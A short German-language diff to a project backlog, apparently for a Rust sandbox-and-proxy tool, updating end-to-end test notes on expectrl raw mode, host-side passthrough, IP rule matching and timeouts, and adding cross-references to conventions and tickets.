-- `expectrl` mit Raw-Mode: der Test setzt `TERM=dumb` und prüft nur Substrings, keine Escape-Sequenzen.
+- Der Passthrough funktioniert, weil der Proxy auf dem Host läuft und dort das Ziel erreicht; in der Sandbox gibt es kein Loopback zum Host. Das ist die gewollte Architektur; der Lauf dokumentiert das.
+- `HostName::Ip` matcht nur eine Regel mit `ip:`/`cidr:` oder die Durchreiche (exakt); deshalb `example.com` per `resolver.overrides` und nicht eine zweite IP-Regel.
+- Timing: Warte-Timeouts großzügig (10 s), Gesamtlaufzeit begrenzen; Zusicherungen, die aus zwei Gründen leer sein könnten, paarweise (CONVENTIONS 4.22).
+- Die Agentenausgabe ist ein Bytestrom; Substrings prüfen, keine Escape-Sequenzen voraussetzen.
 
 ### Referenzen
-BACKLOG.md Abschnitt 8 (Demo-Skript-Regel), Sprint-3-Tabelle; HUM-021, HUM-036 (Vorläufer). axum, `expectrl`.
+BACKLOG.md Abschnitt 8 (Demo-Skript-Regel), Sprint-3-Tabelle; CONVENTIONS.md 3.11, 4.5, 4.21, 4.22; HUM-021, HUM-036 (Vorläufer), HUM-087, HUM-088; `tests/e2e/lib.sh`, `tests/e2e/m2_first_decision/run.sh`.
 
 
 ## HUM-071 · Agent-Briefing
